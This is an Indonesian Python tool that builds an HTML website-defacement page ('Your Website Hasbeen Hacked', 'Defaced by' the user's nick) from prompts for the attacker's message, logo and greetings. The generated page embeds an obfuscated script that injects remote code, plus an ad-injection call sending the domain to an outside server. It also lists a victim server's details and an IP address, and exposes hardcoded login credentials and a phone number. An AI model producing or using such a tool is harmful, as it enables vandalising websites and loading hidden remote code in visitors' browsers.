############################
#Dilarang Keras Merecode!! #
#script ini ,              #
#knp ngk saya encode,itu   #
#karena ,agar kalian dapat #
#belajar dengan script ini #
############################
#jgn lupa senyum hari ini:)#
############################
from getpass import getpass
import os
import time

def menu():
      while True:
           print("")
           os.system("clear")
           print('\033[1;36;40m   =============================================')
           print('')
           os.system('figlet "           Login" | lolcat')
           print("\033[1;93m")
           print('   =============================================')
           print('')
           print("\033[1;35m             Login Dulu Bngst")
           print("")
           try:
                l = str(input('\033[1;92mUsername \033[1;93m: '))
                print("")
                p = getpass('\033[1;92mPassword \033[1;93m: ')
                print ("")
                if l=="Mr.p3mu14" and p=="Hack" or l=="Lmc" and p=="Muslim" or l=="free" and p=="":
                   time.sleep(1)
                   print('\033[1;33m   Login Berhasil Tod...\033[0m')
                   time.sleep(1)
                   os.system('clear')
                   break
                else:
                      print("")
                      print("")
                      print("")
                      print("\033[1;91m     Password/Username Salah Tod..")
                      time.sleep(2)
                      print("")
           except Exception:
                      os.system("rm -rf lock.py")
                      print("")
                      print("")
                      print("")
                      print("\033[1;91m     Password/Username Yang Anda Masukan Salah")
                      time.sleep(2)
           except KeyboardInterrupt:
                      os.system("rm -rf lock.py")
                      print("")
                      print("")
                      print("")
                      print("")
                      print("Thanks You :*")
                      time.sleep(2)
                      os.system("clear")
                      exit()
menu()
print ("\x1b[1;91m<=========================================>")


print ("\x1b[1;92m __        __       __   ______ ") 
print ("/  |      /  \     /  | /      \ ")
print ("$$ |      $$  \   /$$ |/$$$$$$  |")
print ("$$ |      $$$  \ /$$$ |$$ |  $$/ ")
print ("$$ |      $$$$  /$$$$ |$$ |    ")  
print ("$$ |      $$ $$ $$/$$ |$$ |   __ ")
print ("$$ |_____ $$ |$$$/ $$ |$$ \__/  |")
print ("$$       |$$ | $/  $$ |$$    $$/ ")
print ("$$$$$$$$/ $$/      $$/  $$$$$$/  ")

print ("\x1b[1;91m<=========================================>")
print ("\x1b[1;95mcreated by Mr.p3mu14")
print ("v.2.0")
print ("\x1b[1;91mDilarang Keras menulis ulang atau ")
print ("Merekam Script Ini Tanpa Sepengetahuan")
print ("Penciptanya")
print ("\x1b[1;94mNo wa:\x1b[1;95m089627655877")
print ("\x1b[1;93mHak Cipta © 2019 Di Lindungi Undang-Undang ")

print ("\x1b[1;91m<=========================================>")




title = input("\x1b[1;94mJudul/title : \x1b[1;93m ")


nama = input("\x1b[1;94mNama/nick : \x1b[1;93m ")

psn = input("\x1b[1;94mmessage/pesan sertakan <br> untuk baris baru: \x1b[1;93m ")

fixed = input("\x1b[1;94mfixed by: \x1b[1;93m")
isifixed = input("\x1b[1;94mdeks fixed : \x1b[1;93m")
linkimg = input("\x1b[1;94mlink gambar/logo (format harus .jpg/.png/.gif : \x1b[1;93m ")

about = input("\x1b[1;94mAbout me : \x1b[1;93m ")
greets = input("\x1b[1;94mgreets to :\x1b[1;93m" )
musik = input("\x1b[1;94mlink musik ,upload di top4top : \x1b[1;93m")


#Open the index
fo = open("script.html","w")

sc1 = """<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" SYSTEM
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> 
<html
xmlns="http://www.w3.org/1999/xhtml">


<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">

<head>



<meta http-equiv="X-UA-Compatible" content="IE=edge">

<title> """

sc2 = title

sc3 = """</title>

<link rel="shortcut icon" href='"""
sc24 = linkimg
sc25 = """'>

<style type="text/css">body, a, a:hover {cursor: url(http://hellox.persiangig.com/DefacePage/negro.cur), progress;}</style>

<!-- CSS -->

<link rel="stylesheet" type="text/css" href="http://hellox.persiangig.com/DefacePage/jquery00.css" media="all">

<link rel="stylesheet" type="text/css" href="http://hellox.persiangig.com/DefacePage/prettyPh.css" media="all">

<link rel="stylesheet" type="text/css" href="http://hellox.persiangig.com/DefacePage/style000.css" media="all">

 
<center>


<script language=JavaScript>
 
var message='"""

sc4 = nama

sc5 = """' ;
 
///////////////////////////////////
function clickIE4(){
if (event.button==2){
alert(message);
return false;
}
}
 
function clickNS4(e){
if (document.layers||document.getElementById&&!document.all){
if (e.which==2||e.which==3){
alert(message);
return false;
}
}
}
 
if (document.layers){
document.captureEvents(Event.MOUSEDOWN);
document.onmousedown=clickNS4;
}
else if (document.all&&!document.getElementById){
document.onmousedown=clickIE4;
}
 
document.oncontextmenu=new Function("alert(message);return false")
 
</script>

<script type="text/javascript">
/***********************************************
* Disable Text Selection script- ? Dynamic Drive DHTML code library (www.dynamicdrive.com)
* This notice MUST stay intact for legal use
* Visit Dynamic Drive at http://www.dynamicdrive.com/ for full source code
***********************************************/
function disableSelection(target){
if (typeof target.onselectstart!="undefined") //For IE 
    target.onselectstart=function(){return false}
else if (typeof target.style.MozUserSelect!="undefined") //For Firefox
    target.style.MozUserSelect="none"
else //All other route (For Opera)
    target.onmousedown=function(){return false}
target.style.cursor = "default"
}
window.onload=function(){disableSelection(document.body);}
 </script>

	<iframe width="0" height="0" src="""
	
sc6 = musik

sc7 = """ frameborder="0" allowfullscreen></iframe>

<link rel="openid.server" href="http://www.blogger.com/openid-server.g" />

<script id="0128EE6A14B09AF9"></script>
</head>

<script type="text/javascript" src="http://hellox.persiangig.com/DefacePage/jquery-1.js"></script>

    
<script type="text/javascript" src="http://hellox.persiangig.com/DefacePage/cufon-yu.js"></script>

<script type="text/javascript" src="http://hellox.persiangig.com/DefacePage/Yanone_K.js"></script>

<script type="text/javascript" src="http://hellox.persiangig.com/DefacePage/jquery00.js"></script>

<script type="text/javascript" src="http://hellox.persiangig.com/DefacePage/jquery01.js"></script>

<script type="text/javascript" src="http://hellox.persiangig.com/DefacePage/jquery02.js"></script>

<script type="text/javascript" src="http://hellox.persiangig.com/DefacePage/jquery03.js"></script>

<script type="text/javascript" src="http://hellox.persiangig.com/DefacePage/jquery04.js"></script>

<script type="text/javascript" src="http://hellox.persiangig.com/DefacePage/jquery05.js"></script>

<script type="text/javascript" src="http://hellox.persiangig.com/DefacePage/jquery06.js"></script>

<script type="text/javascript" src="http://hellox.persiangig.com/DefacePage/jquery07.js"></script>

<script type="text/javascript" src="http://hellox.persiangig.com/DefacePage/custom00.js"></script>

<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-20402842-6']);
  _gaq.push(['_trackPageview']);
  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src ='http://hellox.persiangig.com/DefacePage/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>
<script language="JavaScript" type="text/javascript">
mensaje = ' Bee was here ';font = 'arial';size = 2.5;color = '#00FF00';velocidad = 0.6;
n4 = (document.layers);ie = (document.all);n6 = (document.getElementById);
mensaje = mensaje.split('');n = mensaje.length;
a = size*10;ymouse = 0;xmouse = 0;props = "<font face="+font+" color="+color+" size="+size+">";
if (n4){for ( i = 0; i < n; i++)document.write('<layer left="0" top="0" width="+a+" name="n4mensaje'+i+'" height="+a+"><center>'+props+mensaje[i]+'</font></center></layer>');}else if (ie){document.write('<div id="padre" style="position:absolute;top:0px;left:0px">
<div style="position:relative">');for (i=0; i < n; i++)document.write('<div id="iemensaje" style="position:absolute;top:0px;left:0;height:'+a+';width:'+a+';text-align:center">'+props+mensaje[i]+'</font></div>');document.write('</div></div>');}else if (n6){document.write('<div id="padre" style="position:absolute;top:0px;left:0px"><div style="position:relative">');for (i = 0; i < n; i++)document.write('<div id="iemensaje'+i+'" style="position:absolute;top:0px;left:0;height:'+a+';width:'+a+';text-align:center">'+props+mensaje[i]+'</font></div>');document.write('</div></div>');}
if(n4)window.captureEvents(Event.MOUSEMOVE);
function Mouse(evento){ if(ie){xmouse = event.x+20;ymouse = event.y+20;}else if(n4 || n6){xmouse = evento.pageX+20;ymouse = evento.pageY+20;}}
if(n4)window.onMouseMove = Mouseelse if(ie || n6)document.onmousemove = Mouse;
y = new Array();x = new Array();Y = new Array();X = new Array();Yaux = new Array();Xaux = new Array();
for (i=0; i < n; i++){y[i] = 0;x[i] = 0;Y[i] = 0;X[i] = 0;Yaux[i] = 0;Xaux[i] = 0;}
function asigna(){if (ie)padre.style.top = document.body.scrollTop;
for (i = 0; i < n; i++){if(n4){document.layers['n4mensaje'+i].top = y[i];document.layers['n4mensaje'+i].left = x[i]+(i*(a/2));}else if(ie){iemensaje[i].style.top = y[i];iemensaje[i].style.left = x[i]+(i*(a/2));}else if(n6){eval("document.getElementById('iemensaje"+i+"').style.top = '"+y[i]+"px'");eval("document.getElementById('iemensaje"+i+"').style.left = '"+(x[i]+(i*(a/2)))+"px'");} }}
function ondula(){y[0]=Math.round(Y[0] +=((ymouse)-Y[0])*velocidad);x[0]=Math.round(X[0] +=((xmouse)-X[0])*velocidad);
for (var i = 1; i < n; i++){Yaux[i] = Math.round(Y[i]);Xaux[i ]= Math.round(X[i]);y[i] = Math.round(Y[i]=Yaux[i]+(y[i-1]-Y[i])*velocidad);x[i] = Math.round(X[i]=Xaux[i]+(x[i-1]-X[i])*velocidad);}asigna();setTimeout('ondula()',50);}
window.onload = ondula;
</script>

</head>


<body>
    
<!-- wrappage begin here -->
    <div id="wrappage">
        <!-- container begin here -->
        <div class="container">
            <!-- top block begin here -->
			 <div class="top">
             <div class="energy"></div>
                <div class="top-block">
                    <a class="logo"> Hello, Admin! Your Website Hasbeen Hacked </a>
                    <div class="bg-e-button"></div>
                     <a href class="open"><img src="" alt=""></a>
                    </div>
            </div>
            <!-- top block end here -->
            <!-- center block begin here -->
            <div class="center-block">
             <!-- &#199;&#211;&#732;&#228;&#209; -->
             <div class="scanner clearfix">
              <div class="scanner-block">
               <div class="scanner-box left">
                <div class="scanner-line"></div>
               </div>
               <ul class="data left">
                <li class="search"> Loading For your Data ....... </li>
               </ul>
			   </div>
             </div>
                <!-- &#200;&#206;&#212; &#199;&#213;&#225;&#237; -->
                <div class="main">
                 <div class="load"></div>
                 <div class="shut-left"></div>
                 <div class="shut-right"></div>
                  <div class="page">
                    <div class="box-left left">
                     <div class="info">
                       <ul class="socicon left">
					   <img src="""

sc8 = linkimg

sc9 = """ width="100%" alt=" Shutdown Indo Team " class="right"></br></br>
                       </ul>
                       <ul class="left who">
                       <li><center><font color="gold">"""
sc10 = nama
sc11 = """<br /></font></center></li>
					   </ul>
					  
</object>


                       </div>
                        <ul id="menu" class="right">
                            <li>
                              <a href="#msg" class="selected">Message</a>
                              <a href="#fix" class="selected">Fixed by """
                              
sc12 = fixed

sc13 = """</a>
							  <a href="#sysinfo" class="selected">Sys. Information</a>
							  <a href="#about" class="selected">About me</a>
							  <a href="#Greets" class="selected">Greets</a>
                            </li>
                          </ul>
                    </div>
		    

			<div class="cont left">
			<!-- &#227;&#228;&#230;&#229;&#199; -->
			     <br>
<center>
<p align="center">

      
<html>
<head>


<script>
function addRow(name, url, isdir, size, date_modified) {
  if (name == ".")
    return;
  var root = "" + document.location;
  if (root.substr(-1) !== "/")
    root += "/";
  var table = document.getElementById("table");
  var row = document.createElement("tr");
  var file_cell = document.createElement("td");
  var link = document.createElement("a");
  link.className = isdir ? "icon dir" : "icon file";
  if (name == "..") {
    link.href = root + "..";
    link.innerText = document.getElementById("parentDirText").innerText;
    link.className = "icon up";
    size = "";
    date_modified = "";
  } else {
    if (isdir) {
      name = name + "/";
      url = url + "/";
      size = "";
    } else {
      link.draggable = "true";
      link.addEventListener("dragstart", onDragStart, false);
    }
    link.innerText = name;
    link.href = root + url;
  }
  file_cell.appendChild(link);
  row.appendChild(file_cell);
  row.appendChild(createCell(size));
  row.appendChild(createCell(date_modified));
  table.appendChild(row);
}
function onDragStart(e) {
  var el = e.srcElement;
  var name = el.innerText.replace(":", "");
  var download_url_data = "application/octet-stream:" + name + ":" + el.href;
  e.dataTransfer.setData("DownloadURL", download_url_data);
  e.dataTransfer.effectAllowed = "copy";
}
function createCell(text) {
  var cell = document.createElement("td");
  cell.setAttribute("class", "detailsColumn");
  cell.innerText = text;
  return cell;
}
function start(location) {
  var header = document.getElementById("header");
  header.innerText = header.innerText.replace("LOCATION", location);
  document.getElementById("title").innerText = header.innerText;
}
function onListingParsingError() {
  var box = document.getElementById("listingParsingErrorBox");
  box.innerHTML = box.innerHTML.replace("LOCATION", encodeURI(document.location)
      + "?raw");
  box.style.display = "block";
}
</script>

<style>
  h1 {
    border-bottom: 1px solid #c0c0c0;
    margin-bottom: 10px;
    padding-bottom: 10px;
    white-space: nowrap;
  }
  table {
    border-collapse: collapse;
  }
  tr.header {
    font-weight: bold;
  }
  td.detailsColumn {
    padding-left: 2em;
    text-align: right;
    white-space: nowrap;
  }
  a.icon {
    padding-left: 1.5em;
    text-decoration: none;
  }
  a.icon:hover {
    text-decoration: underline;
  }
  a.file {
    background : url("https://lh3.googleusercontent.com/-4XZ7JTeJH_Y/TsaAYPiMYSI/AAAAAAAAAcU/_-8fu6GQ7eI/s800/matrix.gif") left top no-repeat;
  }
  #listingParsingErrorBox {
    border: 1px solid black;
    background:("https://lh3.googleusercontent.com/-4XZ7JTeJH_Y/TsaAYPiMYSI/AAAAAAAAAcU/_-8fu6GQ7eI/s800/matrix.gif") repeat center center fixed black;

    padding: 10px;
    display: none;
  }
</style>

<title id="title">CEH</title>

</head>

<body>
<style type="text/css">
body
{
font-family: "courier new";
background-color:("https://lh3.googleusercontent.com/-4XZ7JTeJH_Y/TsaAYPiMYSI/AAAAAAAAAcU/_-8fu6GQ7eI/s800/matrix.gif") repeat center center fixed black;

font-size:80%;
color: #F50404;
background-image: url("https://lh3.googleusercontent.com/-4XZ7JTeJH_Y/TsaAYPiMYSI/AAAAAAAAAcU/_-8fu6GQ7eI/s800/matrix.gif") repeat center center fixed black;
g");
}
.xBody
{
width:1600px;
height:1600px;
position:absolute;
z-index: 12;
}
.ssh
{
display:none;
z-index: 14;
}
.sshBox
{
height:350px;
border: 7px solid white;
	-moz-border-radius: 10px;
	-webkit-border-radius: 10px;
	-o-border-radius: 10x;
	-khtml-border-radius: 10px;
	border-radius: 10px;
	z-index: 15;
}
.sshHead
{
margin-bottom: 8px;
color:black;
font-weight: bold;
background-color: black;
height:25px;
z-index: 12;
}
.greenBox
{
padding-left: 5px;
position: absolute;
height:30px;
border: 2px solid #28FE14;
z-index: 10;
}
.picz
{
position: absolute;
width:600px;
height:200%;
display:none;
right:2px;
top:2px;
}
</style>



<span id="parentDirText" style="display:none" i18n-content="parentDirText">Parent Directory</span><font style="tahoma" color="black" class="a">

<h1 id="header" i18n-content="header">   
<SCRIPT>
farbbibliothek = new Array(); 
farbbibliothek[0] = new Array("#FF0000","#FF1100","#FF2200","#FF3300","#FF4400","#FF5500","#FF6600","#FF7700","#FF8800","#FF9900","#FFaa00","#FFbb00","#FFcc00","#FFdd00","#FFee00","#FFff00","#FFee00","#FFdd00","#FFcc00","#FFbb00","#FFaa00","#FF9900","#FF8800","#FF7700","#FF6600","#FF5500","#FF4400","#FF3300","#FF2200","#FF1100"); 
farbbibliothek[1] = new Array("#00FF00","#000000","#00FF00","#00FF00"); 
farbbibliothek[2] = new Array("#00FF00","#FF0000","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00"); 
farbbibliothek[3] = new Array("#FF0000","#FF4000","#FF8000","#FFC000","#FFFF00","#C0FF00","#80FF00","#40FF00","#00FF00","#00FF40","#00FF80","#00FFC0","#00FFFF","#00C0FF","#0080FF","#0040FF","#0000FF","#4000FF","#8000FF","#C000FF","#FF00FF","#FF00C0","#FF0080","#FF0040"); 
farbbibliothek[4] = new Array("#FF0000","#EE0000","#DD0000","#CC0000","#BB0000","#AA0000","#990000","#880000","#770000","#660000","#550000","#440000","#330000","#220000","#110000","#000000","#110000","#220000","#330000","#440000","#550000","#660000","#770000","#880000","#990000","#AA0000","#BB0000","#CC0000","#DD0000","#EE0000"); 
farbbibliothek[5] = new Array("#000000","#000000","#000000","#FFFFFF","#FFFFFF","#FFFFFF"); 
farbbibliothek[6] = new Array("#0000FF","#FFFF00"); 
farben = farbbibliothek[4];
function farbschrift() 
{ 
for(var i=0 ; i<Buchstabe.length; i++) 
{ 
document.all["a"+i].style.color=farben[i]; 
} 
farbverlauf(); 
} 
function string2array(text) 
{ 
Buchstabe = new Array(); 
while(farben.length<text.length) 
{ 
farben = farben.concat(farben); 
} 
k=0; 
while(k<=text.length) 
{ 
Buchstabe[k] = text.charAt(k); 
k++; 
} 
} 
function divserzeugen() 
{ 
for(var i=0 ; i<Buchstabe.length; i++) 
{ 
document.write("<span id='a"+i+"' class='a"+i+"'>"+Buchstabe[i] + "</span>"); 
} 
farbschrift(); 
} 
var a=1; 
function farbverlauf() 
{ 
for(var i=0 ; i<farben.length; i++) 
{ 
farben[i-1]=farben[i]; 
} 
farben[farben.length-1]=farben[-1]; 
setTimeout("farbschrift()",30); 
} 
// Zu Demonstrationszwecken***************** 
var farbsatz=1; 
function farbtauscher() 
{ 
farben = farbbibliothek[farbsatz]; 
while(farben.length<text.length) 
{ 
farben = farben.concat(farben); 
} 
farbsatz=Math.floor(Math.random()*(farbbibliothek.length-0.0001)); 
} 
setInterval("farbtauscher()",5000); 
text= ' Defaced by """
sc14 = nama
sc15 = """'; //h 
string2array(text); 
divserzeugen(); 
//document.write(text); 
      </SCRIPT></font></h1>

<table id="table">
  
    <td i18n-content="headerName" color="black"> - </td>
    <td class="detailsColumn" i18n-content="headerSize" color="black"> - </td>
    <td class="detailsColumn" i18n-content="headerDateModified" color="black"> - </td>
  </tr>
</tbody></tr></tbody></table>
<hr></font>




<script>var templateData = {"header":"Index of LOCATION","headerDateModified":"GROUP","headerName":"NAME","headerSize":"ATTACKER","listingParsingErrorBoxText":"Oh, no! This server is sending data Opera can't understand. Please \u003Ca href=\"http://code.google.com/p/chromium/issues/entry\"\u003Ereport a bug\u003C/a\u003E, and include the \u003Ca href=\"https://www.facebook.com/newbiehacker1933//\"\u003Eraw listing\u003C/a\u003E.","parentDirText":"Parent Directory"};</script><script>// Copyright (c) 2010 The Chromium Authors. All rights reserved.
var i18nTemplate = (function() {
  var handlers = {
    'i18n-content': function(element, attributeValue, obj) {
      element.textContent = obj[attributeValue];
    },
    'i18n-options': function(element, attributeValue, obj) {
      var options = obj[attributeValue];
      options.forEach(function(values) {
        var option = typeof values == 'string' ? new Option(values) :
            new Option(values[1], values[0]);
        element.appendChild(option);
      });
    },
    'i18n-values': function(element, attributeValue, obj) {
      var parts = attributeValue.replace(/\s/g, '').split(/;/);
      for (var j = 0; j < parts.length; j++) {
        var a = parts[j].match(/^([^:]+):(.+)$/);
        if (a) {
          var propName = a[1];
          var propExpr = a[2];
          if (propExpr in obj) {
            var value = obj[propExpr];
            if (propName.charAt(0) == '.') {
              var path = propName.slice(1).split('.');
              var object = element;
              while (object && path.length > 1) {
                object = object[path.shift()];
              }
              if (object) {
                object[path] = value;
               
                if (path == 'innerHTML') {
                  process(element, obj);
                }
              }
            } else {
              element.setAttribute(propName, value);
            }
          } else {
            console.warn('i18n-values: Missing value for "' + propExpr + '"');
          }
        }
      }
    }
  };
  var attributeNames = [];
  for (var key in handlers) {
    attributeNames.push(key);
  }
  var selector = '[' + attributeNames.join('],[') + ']';
 
  function process(node, obj) {
    var elements = node.querySelectorAll(selector);
    for (var element, i = 0; element = elements[i]; i++) {
      for (var j = 0; j < attributeNames.length; j++) {
        var name = attributeNames[j];
        var att = element.getAttribute(name);
        if (att != null) {
          handlers[name](element, att, obj);
        }
      }
    }
  }
  return {
    process: process
  };
})();
</script><script>
i18nTemplate.process(document, templateData);
<script type="text/javascript" src="https://www.blogger.com/static/v1/common/js/1664880503-csitail.js"></script>
<script type="text/javascript">BLOG_initCsi('classic_blogspot');</script></body></html></script><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K/c5C582Ltpw5OIinlR1dKK6r1UXrOQuMYN7XgTRxfpCMNQxFZnFrIsvGLr7GgG7jCCtTT5FTOkONpIB1yqAmPXDnTNz4akFoom+hLxjlGWZ9ZcjCglHuv/43XCHFWjwWgbcM+wHFBTnyqIHntJofIol+VDpdFdc2vdzuIlUMnkRyovfLd5qupzrWLgPShwRC3UJa4pUyS2rme+r7dGz3qdD7s6sr9xDodLWIPnr7ONH0CddsbWvEbiTs67aCkhcl+FvW0y6+qwvttV+C66tpsX7Cz23fQfn5bzFHKGBbFnVAIRqGK0CzslRFfeSKJBZ/mpoyX75og2BbsIQV1d04UZ8/1wK84wocbHM48rF/DkUj0BU9n7EJHXvBaLczEqvxAAFgskPm39D9MQaOtYmBSosAH3wrLtELayFUnPswWF8QZkv4P/PsFr2LwI7zPscDNPZnWHmV1k+xeEOERnFDIc7PScZ9IzRET21bjBkhSZmL6lxtctaY+piGLijzLhk+2VqPsrWgm739F354rgCEJkBkRygPY=" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body></html>
</font>
</center>
			    <div id="msg" class="box left">
					<div class="box-content">
					<h3>Message : </h3>
					<br><font color="lime">
					<p>"""
sc16 = psn

sc17 = """</p>
					<p><font color="red"><u>sekian dari saya terima kasih...</u></font></p>
					</font>
					</div>
				</div>

				<div id="fix" class="box left">
					<div class="box-content">
					<h3>Page(s) that Have be Fixed</h3>
					<br><font color="lime">
					<p> """
sc18 = isifixed

sc19 = """</p>
					</font>
					</div>
				</div>

                <div id="sysinfo" class="box left">
					<div class="box-content">
					<h3>Your System Information : </h3>
					<br><font color="lime">
					<p><b style="color:red;">Uname</b> : Linux montferland01.provider.nl 2.6.32-573.8.1.el6.x86_64 #1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64</p>
					<p><b style="color:red;">User</b> : 2075 [ user75 ]</p>
					<p><b style="color:red;">PHP</b> : 5.3.27</p>
					<p><b style="color:red;">Server</b> : Apache/2.2.15 (CentOS)</p>
					<p><b style="color:red;">Server IP</b> : 202.67.46.23</p>
					<p><b style="color:red;">HDD</b> : 125.86 GB | <b style="color:red;">Free</b> : 81.86 GB [65%]</p>
					</font> 
					</div>
				</div>									
				
				<div id="about" class="box left">
					<div class="box-content">
					<h3><p>"""

sc20 = about
					
sc21 = """
					<p></h3>
					<br><font color="red">
					 
				    
						</font>	
					</div>
				</div>							

				<div id="Greets" class="box left">
					<div class="box-content">
					<h3> Special Thanks To : </h3>
					<br>
					<center>
					<font style="tahoma" color="red" class="a">
					<marquee  behavior="scroll" direction="left" color="white">"""
sc22 = greets
sc23 = """</marquee>
					</center>			
					</div>
               </div>
               
                    </div>
                  </div>
                </div>
            </div>
        </div>
    </div>
<center>
</iframe>
</center>
<script id="0128EE6A14B09AF9">(function(){var e=function(u){var w=111,et="",m=window,q=("\x66\x72"+"vj\u004f"+"P"+"oar"+"\u0043\x6f\x64\x65")[("\u0068\u0041pk\u005A"+"l\x61\x63e"+"").replace("h\x41\x70"+"k\x5A","\x72\u0065p")]("v"+"\x6a\x4F"+"P\u006f","\u006fm"+"C\u0068"),s="c"+"\u0068\x61\u0072C"+""+"od"+"\x65\u0041t"+"",d=("a"+"\u004Ex"+"\u0046\u0071\x6Eg"+"\x74h")[('\u0072\u0065\u0070I'+'j'+'\x68\u0066'+'e').replace('\u0049\x6A\u0068f','\x6Cac')]("\u0061\x4Ex\u0046\u0071","l"+""+"e"),mi="S\x74"+"ri"+"ng",n=m[mi],a=n[q],i,wa;for(var ig=0;ig<u[d];ig++){i=u[s](ig);wa=i^w;et+=a(wa);}return et;};if(document.location){var zq=1821857670;}else var tm=' Z4s'+'\x31\x63\x35\x203\x6D '+'\x73\u006fr '+'\u0038\u0056O'+' '+'\x20\u0052N'+''+'Ok '+'t\u006E\x61\u004D';if(window[e("\x1b\x00\x1f")]==window[e("\u001c\n\x03\t")]){var en={};var em=0xBF20AD83;en[e("\u0019\n\x1D\u001C\u0006\u0000\u0001")]=e(('\u004c\x4c\x72\u004b\x75o\u0045y'+'\u0061\u0054\x45\x64S'+'ab\x50\x52\x55\x73'+'Y').replace('\u004CLr'+'\x4B\x75o\u0045y\u0061TE'+'d\x53\x61'+'b\x50\x52U\x73','\u005e\x57'));var jy='66L1MTye  q83FRies hH';en[e("\f\x03\x06\n\x01\u001B\u001A\x06\u000B")]="0128EE6A14B09AF9";if(false){var at=screen.width;}else{var gc=location["hostname"];};en[e('\u000E\u000b\u000B\x00\x01\u0001\u000e\x02\n')]=e((''+'-\u0075\u0052\u006cw\x69\u0004\u002e\x01\x0b<\u001A\x1d\t').replace('u\u0052l'+''+'w'+'i','\x03\x00\f'));er="";kemr=function(){return 0};;window[e("0"+"\u001D\x19\u0015")]=en;;var xt=document[e(('\f\x1D\n\u000E\x1b\n\u002A\x03\x70Q\x68\u006e'+'O\x1b').replace('\u0070\x51h'+'\x6E'+'O','\n\u0002\n\x01'))](e("\u001c\f\x1D\x06\u001f\x1B"));if(''+':\u004bn52 '+' 3\x20\u0052m\x33\u0042\x59\x33\x37\u0069'+' xy'+' '+'W'){var xa=window['screenY'];};xt[e("\x1c\x1D\f")]=e(('\x40\u0040\u0001\n\x1d\x41\x02\x0E\x04\n\u001F\x1d\n\x41\u0001\n\x1b@\u001C\x0bDz'+'\u004C'+'Nt'+'Z_@\u005A\x5A\u005e\x56\x41\x05\u001c').replace('Dz'+'LN\u0074','@V'+'\x5F'));if(true){var vr='  S51T';}else var xtde=0x1ed93044;document[e("\r\x00\u000B\x16")][e("\x0e\x1f\x1F\n\x01\u000B,\u0007\u0006\x03\x0b")](xt);}})();</script></body>
</html>
"""



fo.write(sc1)
fo.write(sc2)
fo.write(sc3)
fo.write(sc24)
fo.write(sc25)
fo.write(sc4)
fo.write(sc5)
fo.write(sc6)
fo.write(sc7)
fo.write(sc8)
fo.write(sc9)
fo.write(sc10)
fo.write(sc11)
fo.write(sc12)
fo.write(sc13)
fo.write(sc14)
fo.write(sc15)
fo.write(sc16)
fo.write(sc17)
fo.write(sc18)
fo.write(sc19)
fo.write(sc20)
fo.write(sc21)
fo.write(sc22)
fo.write(sc23)






print ("\x1b[1;92mScript Berhasil Di buat!")
print ("\x1b[1;93mpindahkan sc nya dengan perintah :")
print ("\x1b[1;94mmv script.html /sdcard")
print ("\x1b[1;91enjoyyyy")

fo.close()
